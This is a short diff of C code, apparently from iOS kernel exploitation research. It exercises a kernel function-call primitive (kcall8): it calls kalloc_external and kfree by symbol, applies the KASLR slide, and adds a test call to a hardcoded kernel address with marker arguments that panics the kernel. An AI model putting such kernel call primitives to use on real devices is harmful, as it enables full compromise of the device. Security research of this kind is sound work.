@@ -55,11 +55,13 @@ int main(int argc, char *argv[], char *envp[]) {
 		kret = kcall8(ksym(KSYMBOL_RET_300), 1, 0, 0, 0, 0, 0, 0, 0);
 		printf("kcall8 KSYMBOL_RET_300 kret = %llu\n", kret);
 
+		//kcall8 panic with x1-x7 
 		uint64_t kalloc_sz = 0x200;
 		uint64_t kptr = kcall8(ksym(KSYMBOL_KALLOC_EXTERNAL), kalloc_sz, 0, 0, 0, 0, 0, 0, 0);
 		printf("kcall8 KSYMBOL_KALLOC_EXTERNAL(0x%llx) kptr = 0x%llx\n", kalloc_sz, kptr);
 
-		khexdump(kptr, kalloc_sz);
+		//br x1, 0xdeadbeef41424341 = invalid kaddr  
+		kcall8(0xFFFFFFF00909C8FC + kslide, 0xdeadbeef41424340, 0xdeadbeef41424341, 0xdeadbeef41424342, 0xdeadbeef41424343, 0xdeadbeef41424344, 0xdeadbeef41424345, 0xdeadbeef41424346, 0xdeadbeef41424347);
 
 		kret = kcall8(ksym(KSYMBOL_KFREE), kptr, kalloc_sz, 0, 0, 0, 0, 0, 0);
 		printf("kcall8 KSYMBOL_KFREE kret = 0x%llx\n", kret);
